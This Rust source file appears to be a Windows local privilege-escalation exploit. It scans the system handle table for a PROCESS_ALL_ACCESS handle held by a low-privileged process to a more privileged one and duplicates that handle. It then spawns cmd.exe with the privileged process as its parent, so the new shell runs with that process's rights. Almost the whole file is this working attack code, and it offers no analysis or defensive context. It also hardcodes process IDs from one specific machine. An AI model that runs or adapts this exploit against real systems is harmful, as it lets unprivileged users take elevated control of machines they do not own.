pub fn getvulnerableprochandles() {
    unsafe{

        let mut bytesneeded = 0u32;

        let mut buffer = loop{

            let mut buffer = vec![0u8;bytesneeded as usize];
            let ntstatus = NtQuerySystemInformation(16, 
                buffer.as_mut_ptr() as *mut c_void, 
                bytesneeded, 
                &mut bytesneeded);
            if NT_SUCCESS(ntstatus){
                break buffer;
            }
   

        };

        let handleinfo2 = *(buffer.clone().as_mut_ptr() as *mut SYSTEM_HANDLE_INFORMATION);
        let mut handlestocheck:Vec<SYSTEM_HANDLE_TABLE_ENTRY_INFO> = Vec::new();
        for i in 0..handleinfo2.NumberOfHandles{
            handlestocheck.push(
                *((buffer.as_mut_ptr() as usize + 8+(i as usize*std::mem::size_of::<SYSTEM_HANDLE_TABLE_ENTRY_INFO>())) as *mut SYSTEM_HANDLE_TABLE_ENTRY_INFO)
            )
        }




        let mut handleinfo = *(buffer.as_mut_ptr() as *mut SYSTEM_HANDLE_INFORMATION);

        for i in 0..handleinfo.NumberOfHandles{

            let mut tableentry =  *((buffer.as_mut_ptr() as usize + 8+(i as usize*std::mem::size_of::<SYSTEM_HANDLE_TABLE_ENTRY_INFO>())) as *mut SYSTEM_HANDLE_TABLE_ENTRY_INFO);

            if tableentry.GrantedAccess!=PROCESS_ALL_ACCESS{
                continue;
            }
            if tableentry.UniqueProcessId == GetCurrentProcessId() as u16{
                continue;
            }

            // checking if we have PROCESS_ALL_ACCESS to lowprivileged process
            let mut prochandle = OpenProcess(PROCESS_ALL_ACCESS, 0, tableentry.UniqueProcessId as u32);
            if prochandle.is_null(){
                continue;
            }



            let mut duphandle = 0 as *mut c_void;
            let res = DuplicateHandle(prochandle, 
                tableentry.HandleValue as *mut c_void, 
                GetCurrentProcess(), 
                &mut duphandle, 
                0,
                 0, DUPLICATE_SAME_ACCESS);
            if res==0{
                CloseHandle(prochandle);
                continue;
            }

            let mut reqsize = 0;
            NtQueryObject(duphandle, 
                2, 
                std::ptr::null_mut(), 
                reqsize, &mut reqsize);


            let mut objecttypeinfobuffer = vec![0u8;reqsize as usize];
            let ntstatus1 = NtQueryObject(duphandle, 
                    2, 
                    objecttypeinfobuffer.as_mut_ptr() as *mut c_void, 
                    reqsize, &mut reqsize);
            if !NT_SUCCESS(ntstatus1){
                CloseHandle(prochandle);
                CloseHandle(duphandle);
                continue;
            }

            let objecttypeinfo = *(objecttypeinfobuffer.as_mut_ptr() as *mut OBJECT_TYPE_INFORMATION);
            let objecttype = unicodetostring(&objecttypeinfo.TypeName, GetCurrentProcess());
            if objecttype.trim_end_matches("\0")!="Process"{
                continue;
            }
            
            
            // checking if any handles have same object address
            // as our lowpriv process
            for j in 0..handlestocheck.len(){
                if handlestocheck[j].Object!= tableentry.Object{
                    continue;
                }
                if handlestocheck[j].ObjectTypeIndex !=0x7{
                    continue;
                }
                if handlestocheck[j].GrantedAccess != PROCESS_ALL_ACCESS{
                    continue;
                }
                if handlestocheck[j].UniqueProcessId == tableentry.UniqueProcessId{
                    continue;
                }


                if handlestocheck[j].UniqueProcessId==4||
                handlestocheck[j].UniqueProcessId==1232||
                handlestocheck[j].UniqueProcessId==16556{
                    continue;
                }


                let prochandle2 =OpenProcess(PROCESS_ALL_ACCESS,0 , handlestocheck[j].UniqueProcessId as u32) ;
                if prochandle2.is_null(){
                    println!("objecttype: {}",objecttype);
                    println!("unique processid: {}",tableentry.UniqueProcessId);
                    println!("other process id: {}",handlestocheck[j].UniqueProcessId);
                    println!("object address space: {:x?}",tableentry.Object);
                    println!("other address space: {:x?}",handlestocheck[j].Object);

                    println!("handle value: {:x?}",tableentry.HandleValue);
                    println!("other handle value: {:x?}",handlestocheck[j].HandleValue);

                    println!("granted access: {:x?}",tableentry.GrantedAccess);
                    println!();


                    let mut reqsize = 0;
                    InitializeProcThreadAttributeList(std::ptr::null_mut(), 1, 0, &mut reqsize);

                    let mut plist = vec![0u8;reqsize];
                    let res2 = InitializeProcThreadAttributeList(plist.as_mut_ptr() as *mut PROC_THREAD_ATTRIBUTE_LIST, 1, 0, &mut reqsize);
                    if res2==0{
                        println!("initializeprocthreadattributes failed: {}",GetLastError());
                        continue;
                    }

                    let mut sinfo = std::mem::zeroed::<STARTUPINFOEXW>();
                    sinfo.StartupInfo.cb = std::mem::size_of::<STARTUPINFOEXW>() as u32;
                  
                    sinfo.lpAttributeList = plist.as_mut_ptr() as *mut PROC_THREAD_ATTRIBUTE_LIST;


                    let res2 = UpdateProcThreadAttribute( sinfo.lpAttributeList , 
                    0, 
                    0x00020000, 
                    &mut duphandle as *mut _ as *mut c_void, 
                    8, 
                    std::ptr::null_mut(), 
                    std::ptr::null_mut());
                    if res2==0{
                        println!("updateprocthreadattr failed: {}",GetLastError());
                        continue;
                    }

                    
                    let mut pinfo = std::mem::zeroed::<PROCESS_INFORMATION>();

                    let res3= CreateProcessW(
                        "C:\\Windows\\System32\\cmd.exe\0".encode_utf16().collect::<Vec<u16>>().as_mut_ptr() as *mut u16, 
                        std::ptr::null_mut(), 
                        std::ptr::null_mut(), 
                        std::ptr::null_mut(), 
                        1, 
                        EXTENDED_STARTUPINFO_PRESENT|CREATE_NEW_CONSOLE, 
                        std::ptr::null_mut(), 
                        std::ptr::null_mut(), 
                        &mut sinfo.StartupInfo, 
                        &mut pinfo);
                    if res3==0{
                        println!("createprocessw failed: {}",GetLastError());
                        
                        continue;
                    }
                    println!("child processid: {}",pinfo.dwProcessId);


                }
                

            }

      
            CloseHandle(duphandle);

            CloseHandle(prochandle);
            
            }



        


    }
}

